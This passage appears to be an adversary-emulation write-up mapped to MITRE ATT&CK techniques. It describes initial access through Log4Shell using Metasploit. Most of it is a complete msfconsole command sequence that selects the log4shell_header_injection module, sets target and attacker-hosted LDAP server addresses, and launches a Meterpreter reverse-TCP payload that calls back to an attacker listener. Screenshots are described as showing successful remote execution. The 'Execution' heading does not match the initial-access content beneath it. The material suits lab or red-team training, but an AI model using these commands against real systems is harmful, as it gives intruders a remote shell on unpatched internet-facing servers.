# **Execution**

An API is used for communication between the control software and the hardware. \[T0871] <https://attack.mitre.org/techniques/T0871/> 


## Objective:

The goal of this step is for the attacker to gain initial access to the victim's network by exploiting a vulnerability in an application or service that is exposed to the internet.


## MITRE Technique: T0819 - Exploit Public-Facing Application

This technique involves using an exploit to take advantage of a weakness in an application that is accessible from the internet. This could be a web server, web application, or any other service that can be reached from outside the organization's network.


## Tools/Services:

1. **Metasploit Framework:** A powerful tool used for developing and executing exploit code against a remote target machine. It includes a large collection of exploits, payloads, and auxiliary modules.


#### **Tools/Services:**

- **Metasploit Framework:** Contains a module specifically for exploiting the Log4Shell vulnerability.


## Applying scenario:

#### **Step 2: Exploit the Vulnerability using Metasploit**<a id="step-2-exploit-the-vulnerability-using-metasploit"></a>

1. **Start Metasploit** Launch the Metasploit console in the attacker machine.

2. **Select the Log4Shell Exploit Module** Use the Log4Shell exploit module.

3. **Set the Target and Payload** Configure the target URL and the payload for the exploi.:

4. **Execute the Exploit** Run the exploit to send the malicious request.

```
# step 1
sudo msfconsole

# step 2
use exploit/multi/http/log4shell_header_injection  

# step 3
setg HTTP_HEADER X-Api-Version
setg RHOSTS <target-ip>  # 10.208.89.15
setg RPORT <target-port> # 8080
setg SRVHOST <host-server-ip> # 10.208.5.100
setg SRVPORT <host-server-port> # 1389
setg TARGETURI <target url> # /
setg HTTP_SRVPORT <target http_port> # 8080
setg LHOST <listening ip - host ip> # 10.208.5.100
setg payload java/meterpreter/reverse_tcp

#step 4
exploit

```

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXeh7p50-5d_oRKm24tuo1s6EdqTHlTk4KLA9h6AkCElp3TTX2Mm7hAEb05MdjOZh_xt_nOPQGl-siacPIyb-fau8j-xTJVLqe1VNvqXve1VhHXC0vwkuLF7ovMkGvcHVzx61G9vh6-0K1syvpRwCH0sGw8F?key=ZVE4yllmhIbKOidz4k1V_g)

**Img 1:** Log4Shell exploit options after setting.

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXftMI1u0FiMs2U11Z-LOdo11LZihx8KraHfZnYA7nIBS9eS-b6bdm52ihI9Cs6WGSoh8L3FmW3huJTYVVliSnJx6M9VKIhwXRoF7-z4x6TWD08v52OwynJXxyJUbGKQ6J8pJr5HPXXg3Hmb8BpAg6MDr70?key=ZVE4yllmhIbKOidz4k1V_g)

**Img 2:** Log4Shell exploit execution with successful remote execution.
